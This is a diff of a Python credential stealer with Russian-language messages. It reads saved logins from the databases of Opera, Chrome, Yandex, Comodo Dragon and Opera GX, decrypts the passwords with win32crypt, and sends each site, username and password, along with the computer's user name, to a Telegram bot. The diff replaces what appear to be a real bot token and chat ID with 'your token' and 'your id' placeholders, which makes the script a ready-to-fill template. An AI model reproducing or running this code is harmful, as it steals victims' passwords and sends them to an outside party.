@@ -3,7 +3,7 @@ import sqlite3
 import win32crypt 
 import telebot 
  
-t0ken = '5083445322:AAHG99Yja3E1LYcO75DUTImiWrJ-tpNyOnc'
+t0ken = 'Ваш токен'
 b0t = telebot.TeleBot(t0ken)
 i = 0
 name_0f_user = getlogin()
@@ -16,7 +16,7 @@ opera_gx = "C:\\Users"  + name_0f_user + "\\AppData\\Local\\Programs\\Opera GX" 
 lsdir=[op3ra,g00gle,yand3x,c0m0d0drag0n,opera_gx] 
 lsbr0wser=["Opera","Google Chrome","Yandex Browser","Comodo Dragon", "opera_gx"] 
 
-b0t.send_message(649800799, "Компьютер:" + name_0f_user) 
+b0t.send_message(Ваш id, "Компьютер:" + name_0f_user) 
 for i in range(len(lsdir)): 
  try: 
     br0wser=lsdir[i] 
@@ -25,15 +25,15 @@ for i in range(len(lsdir)):
     curs0r.execute('SELECT origin_url, username_value, password_value FROM logins') 
     for ii in curs0r.fetchall(): 
         d3cryptpass = win32crypt.CryptUnprotectData(ii[2]) 
-        b0t.send_message(649800799, lsbr0wser[i]) 
-        b0t.send_message(649800799, "----------------------------") 
-        b0t.send_message(649800799, "Сайт: " + ii[0]) 
-        b0t.send_message(649800799, "----------------------------") 
-        b0t.send_message(649800799, "Логин: " + ii[1]) 
-        b0t.send_message(649800799, "----------------------------") 
+        b0t.send_message(Ваш id, lsbr0wser[i]) 
+        b0t.send_message(Ваш id, "----------------------------") 
+        b0t.send_message(Ваш id, "Сайт: " + ii[0]) 
+        b0t.send_message(Ваш id, "----------------------------") 
+        b0t.send_message(Ваш id, "Логин: " + ii[1]) 
+        b0t.send_message(Ваш id, "----------------------------") 
         d3cryptpass=str(d3cryptpass) 
-        b0t.send_message(649800799, "Пароль: " + d3cryptpass) 
-        b0t.send_message(649800799, "----------------------------") 
+        b0t.send_message(Ваш id, "Пароль: " + d3cryptpass) 
+        b0t.send_message(Ваш id, "----------------------------") 
 
  except:
-    b0t.send_message(649800799,"Браузер " + lsbr0wser[i] + "был запущен, или не установлен") 
+    b0t.send_message(Ваш id,"Браузер " + lsbr0wser[i] + "был запущен, или не установлен") 
